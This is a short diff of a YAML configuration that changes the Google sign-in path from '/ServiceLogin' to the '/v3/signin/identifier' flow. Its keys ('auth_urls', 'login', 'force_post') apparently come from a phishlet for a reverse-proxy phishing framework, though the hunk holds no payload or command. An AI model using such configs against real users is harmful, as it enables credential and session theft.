@@ -45,8 +45,8 @@ auth_urls:
 
 login:
   domain: 'accounts.google.com'
-  path : '/ServiceLogin'
-  #path: '/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+  #path : '/ServiceLogin'
+  path: '/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
 
 force_post:
   - path: '/_/signin/sl/challenge'
